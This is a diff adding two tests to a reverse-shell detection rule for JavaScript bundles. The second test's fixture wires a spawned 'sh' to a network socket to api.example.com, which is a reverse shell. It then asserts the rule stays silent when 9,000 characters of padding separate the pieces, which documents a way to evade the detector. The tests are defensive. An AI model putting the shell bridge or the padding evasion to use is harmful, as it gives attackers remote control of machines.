@@ -149,3 +149,26 @@ def test_silent_for_legit_stream_pipe(make_context: MakeContext) -> None:
     """
     ctx = make_context(files={"extension.js": src})
     assert ReverseShellRule().evaluate(ctx) == []
+
+
+def test_silent_when_bundle_contains_unrelated_shell_socket_and_pipe_libraries(
+    make_context: MakeContext,
+) -> None:
+    padding = "const bundledData = '" + ("x" * 9000) + "';"
+    src = (
+        'const cp = require("child_process"); const proc = cp.exec("sh -c git status");'
+        + padding
+        + 'const net = require("net"); const sock = net.connect(443, "api.example.com");'
+        + "source.pipe(destination);"
+    )
+    assert ReverseShellRule().evaluate(make_context(files={"bundle.js": src})) == []
+
+
+def test_silent_when_bridge_is_outside_bounded_chain(make_context: MakeContext) -> None:
+    src = (
+        'const cp = require("child_process"); const proc = cp.exec("sh");'
+        'const net = require("net"); const sock = net.connect(443, "api.example.com");'
+        + ("x" * 9000)
+        + "sock.pipe(proc.stdin); proc.stdout.pipe(sock);"
+    )
+    assert ReverseShellRule().evaluate(make_context(files={"bundle.js": src})) == []
